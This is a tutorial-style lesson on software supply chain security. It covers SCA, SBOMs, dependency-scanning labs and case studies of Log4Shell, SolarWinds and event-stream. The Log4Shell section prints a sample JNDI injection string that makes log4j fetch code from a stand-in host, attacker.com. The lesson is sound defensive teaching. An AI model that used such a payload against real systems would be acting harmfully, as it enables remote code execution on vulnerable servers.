# Day 51: Supply Chain Security & Software Composition Analysis (SCA)

## 📋 Table of Contents
- [Learning Objectives](#learning-objectives)
- [Acronym Decoder](#acronym-decoder)
- [What is Supply Chain Security?](#what-is-supply-chain-security)
- [Software Composition Analysis (SCA)](#software-composition-analysis-sca)
- [Software Bill of Materials (SBOM)](#software-bill-of-materials-sbom)
- [Dependency Scanning Tools](#dependency-scanning-tools)
- [Hands-On Lab](#hands-on-lab)
- [Famous Supply Chain Attacks](#famous-supply-chain-attacks)
- [Best Practices](#best-practices)
- [Interview Questions](#interview-questions)

---

## 🎯 Learning Objectives

By the end of this session, you will:
- ✅ Understand what supply chain security means in software development
- ✅ Explain Software Composition Analysis (SCA) and why it matters
- ✅ Generate and read a Software Bill of Materials (SBOM)
- ✅ Use OWASP Dependency-Check to scan for vulnerable libraries
- ✅ Integrate npm audit and pip-audit into CI/CD pipelines
- ✅ Recognize patterns from real supply chain attacks (Log4Shell, SolarWinds)
- ✅ Configure GitHub Dependabot for automated vulnerability alerts

---

## 📖 Acronym Decoder

| Acronym | Full Name | Simple Explanation |
|---------|-----------|-------------------|
| **SCA** | Software Composition Analysis | Scanning your code to find all third-party libraries and checking if any have known security vulnerabilities |
| **SBOM** | Software Bill of Materials | A list of all ingredients (libraries, components) used to build your software - like a recipe label on food |
| **CVE** | Common Vulnerabilities and Exposures | A public database of known security flaws - each gets a unique ID like CVE-2021-44228 (Log4Shell) |
| **OWASP** | Open Web Application Security Project | A nonprofit organization that creates free security tools and knowledge - like Wikipedia for security |
| **NPM** | Node Package Manager | The tool that downloads JavaScript libraries for your project (like pip for Python) |
| **CWE** | Common Weakness Enumeration | Categories of security mistakes - like "SQL Injection" or "Buffer Overflow" |
| **CVSS** | Common Vulnerability Scoring System | A 0-10 scale measuring how dangerous a vulnerability is (10 = critical, run!) |
| **NVD** | National Vulnerability Database | US government's database of all known CVEs with details and scores |
| **OSS** | Open Source Software | Code that anyone can view, modify, and use for free (like most libraries you `npm install`) |
| **Transitive Dependency** | Dependency of a dependency | You install library A, which secretly installs library B - B is a transitive dependency |

**Real-World Analogy:**
- **SCA** = Food inspector checking your kitchen ingredients for recalls
- **SBOM** = Ingredient list on a cereal box (shows everything inside)
- **CVE** = Recall number issued by health department
- **Transitive dependency** = You buy pasta sauce → sauce contains tomatoes → tomatoes might have pesticides (you didn't choose the tomatoes directly!)

---

## 🔗 What is Supply Chain Security?

### The Problem

Imagine building a web application:
```bash
# Your simple Node.js app
npm install express
```

**What actually happened?**
1. Express installed ✅
2. Express needed 30 other libraries (dependencies) 📦
3. Those 30 libraries needed 200 more libraries (transitive dependencies) 📦📦📦
4. **You now have 231 libraries you didn't write** 😱

**The risk:** If ANY of those 231 libraries has a security flaw, your app is vulnerable!

### Real Example: Left-Pad Incident (2016)

A developer unpublished an 11-line JavaScript library called `left-pad`. Thousands of projects broke because they depended on it. This showed how fragile the software supply chain is!

**Worse:** Attackers can:
- Publish malicious libraries with similar names ("typosquatting": `reqeusts` instead of `requests`)
- Compromise legitimate libraries and inject malware
- Exploit vulnerabilities in old library versions

### The Supply Chain

```
┌─────────────────────────────────────────────────────────────┐
│                    SOFTWARE SUPPLY CHAIN                     │
└─────────────────────────────────────────────────────────────┘

1. Open Source Libraries (GitHub, npm, PyPI)
        ↓
2. Package Managers (npm, pip, Maven)
        ↓
3. Your Application (depends on libraries)
        ↓
4. Container Images (packages your app)
        ↓
5. Production Deployment (runs in Azure/cloud)

⚠️  RISK AT EVERY STEP: Any compromised link breaks the chain!
```

**Supply Chain Security** = Protecting every step of this chain from malicious code.

---

## 🔍 Software Composition Analysis (SCA)

### What Does SCA Do?

**SCA tools scan your project and answer:**
1. **What libraries are you using?** (direct + transitive dependencies)
2. **What versions?** (library@1.2.3)
3. **Do any have known vulnerabilities?** (CVE database check)
4. **How dangerous are they?** (CVSS score: Critical/High/Medium/Low)
5. **Can you upgrade?** (is there a patched version?)

### Why SCA Matters

**Statistics:**
- 80-90% of modern applications are open source code (not written by you!)
- Average Node.js project has **700+ dependencies** 😱
- 2023: 85% of codebases had at least ONE known vulnerability

**Without SCA:** You're driving a car without checking if the brakes work!

### SCA vs Other Scanning

| Tool Type | What It Scans | Example |
|-----------|--------------|---------|
| **SAST** (Static Analysis) | YOUR code for security bugs | Finding SQL injection in your code |
| **SCA** (Composition Analysis) | LIBRARIES you use | Finding vulnerable Express.js version |
| **DAST** (Dynamic Analysis) | Running application | Testing live app for XSS |
| **IaC Scanning** | Infrastructure code | Checkov finding Azure misconfigs |

**Together they cover:** Code + Dependencies + Infrastructure + Runtime

---

## 📦 Software Bill of Materials (SBOM)

### What is an SBOM?

**Analogy:** When you buy a medicine, the box lists all active ingredients + fillers. An SBOM does the same for software!

**SBOM contains:**
- Name of every component/library
- Version numbers
- License information (MIT, Apache, GPL)
- Where it came from (npm registry, GitHub)
- Relationships (dependency tree)

### Why SBOMs Matter

**2021: SolarWinds Attack**
- Hackers inserted malware into SolarWinds Orion software
- 18,000 customers (including US government) downloaded trojanized updates
- **Problem:** No one had visibility into what was inside the software!

**Result:** US Executive Order 14028 (2021) now REQUIRES SBOMs for government software!

### SBOM Formats

1. **SPDX** (Software Package Data Exchange)
   - Created by Linux Foundation
   - ISO standard (ISO/IEC 5962:2021)
   - Human + machine readable

2. **CycloneDX**
   - Created by OWASP
   - Lightweight, JSON/XML format
   - Popular in CI/CD pipelines

**Example SBOM (CycloneDX JSON):**
```json
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.4",
  "components": [
    {
      "name": "express",
      "version": "4.18.2",
      "purl": "pkg:npm/express@4.18.2",
      "licenses": [{"license": {"id": "MIT"}}]
    },
    {
      "name": "body-parser",
      "version": "1.20.1",
      "purl": "pkg:npm/body-parser@1.20.1",
      "licenses": [{"license": {"id": "MIT"}}]
    }
  ]
}
```

### When to Generate SBOMs

- ✅ Every production release
- ✅ When dependencies change
- ✅ For compliance/audit requirements
- ✅ When selling software to government/enterprise

---

## 🛠️ Dependency Scanning Tools

### 1. OWASP Dependency-Check

**What:** Free, open-source SCA tool that scans project dependencies against NVD (National Vulnerability Database)

**Supports:**
- Java (Maven, Gradle)
- .NET (NuGet)
- JavaScript (npm, yarn)
- Python (pip)
- Ruby (bundler)
- And 20+ more languages!

**How it works:**
```bash
# Install (requires Java)
wget https://github.com/jeremylong/DependencyCheck/releases/download/v9.0.0/dependency-check-9.0.0-release.zip
unzip dependency-check-9.0.0-release.zip

# Scan a Node.js project
./dependency-check/bin/dependency-check.sh \
  --project "MyApp" \
  --scan ./package.json \
  --format HTML \
  --out ./reports

# Output: HTML report with all vulnerabilities found
```

**Output includes:**
- CVE ID (e.g., CVE-2023-26136)
- Severity (Critical/High/Medium/Low)
- Vulnerable library + version
- Description of the flaw
- Fix recommendation (upgrade to version X.Y.Z)

### 2. NPM Audit (JavaScript/Node.js)

**What:** Built into npm (Node Package Manager), scans `package-lock.json` for known vulnerabilities

**Usage:**
```bash
# Scan current project
npm audit

# Show full report
npm audit --json

# Automatically fix vulnerabilities (upgrades packages)
npm audit fix

# Force major version upgrades (can break your app!)
npm audit fix --force
```

**Example output:**
```
found 3 vulnerabilities (1 moderate, 2 high)
  run `npm audit fix` to fix them, or `npm audit` for details

┌───────────────┬──────────────────────────────────────────────┐
│ Moderate      │ Regular Expression Denial of Service         │
├───────────────┼──────────────────────────────────────────────┤
│ Package       │ minimatch                                    │
├───────────────┼──────────────────────────────────────────────┤
│ Patched in    │ >=3.0.5                                      │
├───────────────┼──────────────────────────────────────────────┤
│ Dependency of │ express [dev]                                │
├───────────────┼──────────────────────────────────────────────┤
│ Path          │ express > glob > minimatch                   │
├───────────────┼──────────────────────────────────────────────┤
│ More info     │ https://npmjs.com/advisories/1234            │
└───────────────┴──────────────────────────────────────────────┘
```

**Key insight:** Shows the FULL PATH of transitive dependencies!

### 3. pip-audit (Python)

**What:** Python equivalent of `npm audit`, maintained by PyPA (Python Packaging Authority)

**Installation:**
```bash
pip install pip-audit
```

**Usage:**
```bash
# Scan current Python environment
pip-audit

# Scan requirements.txt file
pip-audit -r requirements.txt

# Output JSON for CI/CD
pip-audit --format json > vulnerabilities.json

# Fix vulnerabilities automatically
pip-audit --fix
```

**Example output:**
```
Found 2 known vulnerabilities in 1 package

Name    Version ID             Fix Versions
------- ------- -------------- ------------
urllib3 1.26.5  PYSEC-2021-108 1.26.5,2.0.0
urllib3 1.26.5  PYSEC-2021-59  1.26.5,2.0.0
```

### 4. GitHub Dependabot

**What:** GitHub's built-in tool that automatically:
- Scans your repository for vulnerable dependencies
- Creates pull requests to upgrade them
- Runs on every push/PR

**How to enable:**
1. Go to your GitHub repo → Settings → Security
2. Enable "Dependabot alerts" ✅
3. Enable "Dependabot security updates" ✅

**Configuration file** (`.github/dependabot.yml`):
```yaml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10

  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
```

**Result:** Dependabot opens PRs like:
```
🔒 Bump express from 4.17.1 to 4.18.2

Bumps express from 4.17.1 to 4.18.2.
- Release notes
- Changelog
- Commits

This update fixes CVE-2022-24999 (High severity)
```

### 5. Trivy (Container + Dependency Scanner)

**What:** We used this in Day 45 for container scanning, but it ALSO scans dependencies!

```bash
# Scan package.json for vulnerabilities
trivy fs --scanners vuln ./

# Scan Python requirements.txt
trivy fs --scanners vuln requirements.txt
```

**Advantage:** One tool for containers + dependencies + IaC!

---

## 🧪 Hands-On Lab

### Lab 1: Scan a Vulnerable Node.js Project

**Step 1: Create a test project with OLD dependencies**
```bash
mkdir /tmp/vulnerable-app
cd /tmp/vulnerable-app

# Create package.json with OLD Express version (has CVEs)
cat > package.json << 'EOF'
{
  "name": "vulnerable-demo",
  "version": "1.0.0",
  "dependencies": {
    "express": "4.17.1",
    "lodash": "4.17.19",
    "axios": "0.21.1"
  }
}
EOF

# Install dependencies
npm install
```

**Step 2: Run npm audit**
```bash
npm audit

# Expected: Multiple HIGH/CRITICAL vulnerabilities found!
```

**Step 3: Generate SBOM**
```bash
# Install CycloneDX generator
npm install -g @cyclonedx/cyclonedx-npm

# Generate SBOM
cyclonedx-npm --output-file sbom.json

# View SBOM
cat sbom.json | jq '.components[] | {name, version}'
```

**Step 4: Fix vulnerabilities**
```bash
# Automatic fix
npm audit fix

# Check again
npm audit

# See what changed
git diff package-lock.json
```

---

### Lab 2: Python Dependency Scanning

**Step 1: Create requirements.txt with vulnerable packages**
```bash
mkdir /tmp/python-vuln-test
cd /tmp/python-vuln-test

# Old Django version with known CVEs
cat > requirements.txt << 'EOF'
Django==2.2.0
requests==2.20.0
urllib3==1.24.1
EOF
```

**Step 2: Scan with pip-audit**
```bash
# Install pip-audit
pip install pip-audit

# Scan requirements.txt
pip-audit -r requirements.txt

# Expected: CRITICAL vulnerabilities in Django!
```

**Step 3: Generate SBOM for Python**
```bash
# Install sbom generator
pip install sbom4python

# Generate SBOM
sbom4python -r requirements.txt -o sbom-python.json

# View components
cat sbom-python.json | jq '.components[] | {name, version}'
```

---

### Lab 3: OWASP Dependency-Check on Node.js

**Step 1: Install Dependency-Check**
```bash
# Download latest release (v9.0.0)
cd /tmp
wget https://github.com/jeremylong/DependencyCheck/releases/download/v9.0.0/dependency-check-9.0.0-release.zip
unzip dependency-check-9.0.0-release.zip
```

**Step 2: Scan our vulnerable project**
```bash
cd /tmp/vulnerable-app

/tmp/dependency-check/bin/dependency-check.sh \
  --project "Vulnerable Demo" \
  --scan . \
  --format HTML \
  --format JSON \
  --out ./dependency-check-report

# Open HTML report
firefox dependency-check-report/dependency-check-report.html
```

**Step 3: Analyze the report**

The HTML report shows:
- **Summary:** Total dependencies scanned
- **Vulnerabilities:** CVE IDs with severity
- **Dependency tree:** What depends on what
- **Recommendations:** Upgrade paths

---

### Lab 4: GitHub Dependabot Configuration

**Step 1: Create Dependabot config**
```bash
cd /home/yom/cybersecurity-journey/azure-security-mastery

mkdir -p .github
cat > .github/dependabot.yml << 'EOF'
version: 2
updates:
  # Monitor GitHub Actions workflows
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 5

  # Monitor npm packages (if we add any)
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    # Group minor/patch updates
    groups:
      dev-dependencies:
        dependency-type: "development"
      production-dependencies:
        dependency-type: "production"
EOF

git add .github/dependabot.yml
git commit -m "Add Dependabot configuration for supply chain security"
git push origin main
```

**Step 2: Enable Dependabot on GitHub**
1. Go to: https://github.com/YomHubGG/azure-security-mastery/settings/security_analysis
2. Enable "Dependency graph" ✅
3. Enable "Dependabot alerts" ✅
4. Enable "Dependabot security updates" ✅

**Result:** GitHub will now:
- Scan for vulnerable dependencies daily
- Create PRs to fix them automatically
- Alert you via email/notifications

---

## 💥 Famous Supply Chain Attacks

### 1. Log4Shell (CVE-2021-44228) - December 2021

**What happened:**
- Log4j (popular Java logging library) had a CRITICAL remote code execution flaw
- CVSS Score: **10.0** (maximum severity!)
- Affected millions of applications worldwide

**The vulnerability:**
```java
// Malicious string in log message
log.info("User input: ${jndi:ldap://attacker.com/exploit}");

// Log4j would EXECUTE the code from attacker.com!
```

**Impact:**
- Minecraft servers hacked
- Apple iCloud compromised
- IBM, VMware, Cisco affected
- Estimated 35,000+ Java packages vulnerable

**Lessons learned:**
- ONE library flaw = millions of apps vulnerable
- Transitive dependencies hide risks
- Need automated dependency scanning in CI/CD

### 2. SolarWinds (2020)

**What happened:**
- Hackers compromised SolarWinds build system
- Injected malware into Orion software updates
- 18,000 customers downloaded trojanized updates
- Victims: US Treasury, Department of Homeland Security, Microsoft

**Attack vector:**
```
1. Hackers breach SolarWinds build server
2. Insert backdoor into source code
3. Legitimate build process creates infected software
4. Customers trust + download the update
5. Backdoor activates, gives attackers access
```

**Lessons learned:**
- **Build system security** is critical
- **Code signing** alone isn't enough (legitimate signature!)
- Need **SBOM** to verify components
- **Zero trust:** Verify everything, trust nothing

### 3. event-stream npm Package (2018)

**What happened:**
- Popular npm library `event-stream` (2 million downloads/week)
- Original maintainer gave access to "helpful volunteer"
- Volunteer added malicious code to steal Bitcoin wallets
- Stayed undetected for 2 months

**Attack flow:**
```javascript
// Malicious code in event-stream@3.3.6
const cryptoWalletStealer = require('flatmap-stream');

// Only activated if:
// 1. Dependency 'copay-dash' was present
// 2. Environment looked like Bitcoin wallet app
// 3. Then steal wallet keys!
```

**Lessons learned:**
- **Maintainer trust** is a vulnerability
- **Targeted attacks** on specific apps (not all users affected)
- **Dependency pinning** helps (use exact versions)
- **Regular audits** catch suspicious updates

### 4. colors.js and faker.js (2022)

**What happened:**
- Developer intentionally sabotaged his own popular libraries
- Added infinite loop that broke thousands of apps
- Protest against "Fortune 500 companies using my work for free"

**Impact:**
```javascript
// Malicious update added:
while(true) {
  console.log("LIBERTY LIBERTY LIBERTY");
}

// Result: Apps froze, builds failed worldwide
```

**Lessons learned:**
- **Single maintainer risk** (bus factor = 1)
- **License pinning** in package-lock.json matters
- **Private registries** can cache safe versions
- **OSS sustainability** is a real problem

---

## 🛡️ Best Practices

### 1. Dependency Management

```bash
# ✅ DO: Pin exact versions
"dependencies": {
  "express": "4.18.2"  # Exact version
}

# ❌ DON'T: Use wildcards
"dependencies": {
  "express": "*"       # Any version (dangerous!)
  "lodash": "^4.0.0"   # Any 4.x.x (can break)
}
```

**Why:** `^4.17.1` could install `4.99.0` with breaking changes or vulnerabilities!

### 2. Regular Scanning

**CI/CD Pipeline:**
```yaml
# .github/workflows/security-scan.yml
- name: Dependency Vulnerability Scan
  run: |
    npm audit --audit-level=high
    # Fail build if HIGH/CRITICAL found
```

**Frequency:**
- ✅ Every PR/push (automated)
- ✅ Weekly scheduled scans
- ✅ When CVEs are published (Dependabot alerts)

### 3. SBOM Generation

```bash
# Generate SBOM for every release
npm run build
cyclonedx-npm --output-file sbom-v1.2.3.json
# Store SBOM with release artifacts
```

**Why:** You can later check "Did release 1.2.3 include the vulnerable Log4j version?"

### 4. Private Registry (Advanced)

**Problem:** Public npm/PyPI can be compromised or unavailable

**Solution:** Private registry that caches + scans packages
- **Azure Artifacts** (paid)
- **JFrog Artifactory** (paid)
- **Verdaccio** (free, self-hosted npm proxy)

**How it works:**
```
Your App → Private Registry → Public npm
             ↓ (scan here)
          Block if vulnerable!
```

### 5. Least Privilege Dependencies

**Question before `npm install`:**
- Do I REALLY need this library?
- Can I write the 10 lines of code myself?
- Is this library actively maintained?
- Does it have 100+ dependencies? (red flag!)

**Example:** `left-pad` was 11 lines. Writing it yourself = no dependency!

```javascript
// left-pad (11 lines that broke the internet)
function leftPad(str, len, char) {
  char = char || ' ';
  while (str.length < len) str = char + str;
  return str;
}

// You could have just written this! 😅
```

### 6. Review Dependency Updates

**DON'T blindly accept Dependabot PRs!**

✅ **Check:**
- What changed? (read the changelog)
- Why is the version bumped? (security fix or feature?)
- Are there breaking changes? (major version bump)
- Do tests pass after upgrade?

### 7. Monitor CVE Databases

**Subscribe to:**
- GitHub Security Advisories (automatic if Dependabot enabled)
- NVD Data Feeds: https://nvd.nist.gov/vuln/data-feeds
- OSV (Open Source Vulnerabilities): https://osv.dev

**Alert fatigue solution:** Use tools that auto-prioritize (CRITICAL → ignore LOW)

---

## 📝 Interview Questions

### Question 1: What is the difference between SCA and SAST?

**Bad Answer:**
"They both scan code for security issues."

**Good Answer:**
"SAST (Static Application Security Testing) analyzes YOUR code for vulnerabilities like SQL injection or XSS that you wrote. SCA (Software Composition Analysis) analyzes THIRD-PARTY libraries and dependencies for known CVEs. For example:
- SAST finds: 'Your code has an SQL injection on line 45'
- SCA finds: 'You're using Log4j 2.14.1 which has CVE-2021-44228 (Log4Shell)'

They're complementary - you need both to secure modern applications, since 80%+ of your codebase is typically open source dependencies."

---

### Question 2: Explain a transitive dependency and why it's a security risk

**Bad Answer:**
"It's a dependency of a dependency."

**Good Answer:**
"A transitive dependency is when Library A depends on Library B, and you only install A directly. For example:
```bash
npm install express  # You install Express
# Express depends on body-parser
# body-parser depends on depd
# depd depends on ... (chain continues)
```

The security risk is visibility - you never explicitly chose 'depd', don't know it exists, and won't get alerts when it's vulnerable. If depd has CVE-2023-12345, your app is compromised without you knowing.

Real example: The event-stream attack (2018) targeted a transitive dependency. Developers who used a popular library unknowingly pulled in malicious code 4 levels deep in the dependency tree."

---

### Question 3: How would you respond to a CRITICAL CVE in production?

**Bad Answer:**
"Upgrade the library immediately."

**Good Answer:**
"I'd follow this incident response process:

1. **Assess Impact** (15 minutes)
   - Is the vulnerable library actually used in our code?
   - Do we call the vulnerable function? (not all CVEs apply to all usage)
   - What's the blast radius? (one microservice or entire system?)

2. **Check Exploitability** (30 minutes)
   - Is there public exploit code? (PoC on GitHub = urgent!)
   - Are attackers actively exploiting it? (check threat intel)
   - Can we mitigate with WAF rules while we patch?

3. **Test Upgrade** (1-2 hours)
   - Does the fixed version have breaking changes?
   - Run full test suite on staging
   - Check performance impact

4. **Deploy** (1 hour)
   - Deploy to production during maintenance window if possible
   - Monitor for errors/regressions
   - Have rollback plan ready

5. **Post-Mortem** (next day)
   - Why didn't we catch this earlier? (add SCA to CI/CD)
   - Should we pin dependencies more strictly?
   - Document the process for next time

Real example: When Log4Shell dropped (CVE-2021-44228), we'd also check if we're behind a CDN that could block JNDI exploitation patterns while we upgraded."

---

## 🎯 Portfolio Value

**Add to your portfolio/resume:**

✅ "Implemented automated software composition analysis (SCA) using OWASP Dependency-Check and npm audit, identifying and remediating 15 high-severity CVEs across 200+ dependencies"

✅ "Generated Software Bill of Materials (SBOM) in CycloneDX format for compliance with NTIA and CISA requirements"

✅ "Configured GitHub Dependabot for continuous dependency monitoring, reducing vulnerability detection time from weeks to hours"

✅ "Researched and documented lessons learned from Log4Shell (CVE-2021-44228) and SolarWinds supply chain attacks"

**Talking point for interviews:**
"In my Azure security learning, I realized that 85% of codebases have at least one known vulnerability in their dependencies. I set up automated SCA scanning in CI/CD pipelines to catch these before production. For example, I found our test project was using Express 4.17.1 with 3 high-severity CVEs, upgraded to 4.18.2, and documented the process for the team."

---

## 🎓 Summary

**What we learned:**

1. **Supply Chain Security** = Protecting every step from library publication → your production app
2. **SCA** = Scanning dependencies for known CVEs (OWASP Dependency-Check, npm audit, pip-audit)
3. **SBOM** = "Ingredient list" for software (CycloneDX, SPDX formats)
4. **Real attacks:** Log4Shell, SolarWinds, event-stream proved supply chain is a critical risk
5. **Best practices:** Pin versions, scan regularly, generate SBOMs, review updates, use Dependabot

**Key insight:** Modern apps are 80%+ open source code. If you're not scanning dependencies, you're flying blind!

**Next steps:**
- Day 53: Secret Management (Azure Key Vault, HashiCorp Vault)
- Day 55: Cloud Security Posture Management (CSPM)

---

## 📚 Additional Resources

- **OWASP Dependency-Check:** https://owasp.org/www-project-dependency-check/
- **CycloneDX SBOM Standard:** https://cyclonedx.org/
- **CISA SBOM Guide:** https://www.cisa.gov/sbom
- **npm Audit Documentation:** https://docs.npmjs.com/cli/v9/commands/npm-audit
- **GitHub Dependabot:** https://docs.github.com/en/code-security/dependabot
- **Log4Shell Explained:** https://www.lunasec.io/docs/blog/log4j-zero-day/
- **NTIA SBOM Minimum Elements:** https://www.ntia.gov/files/ntia/publications/sbom_minimum_elements_report.pdf

---

**💬 Questions or stuck?** This is complex stuff - supply chain security is an evolving field. Take your time with the labs, and remember: every developer is learning this together after Log4Shell! 🚀

**Cost: €0.00** - All tools used today are free and open source! 🎉
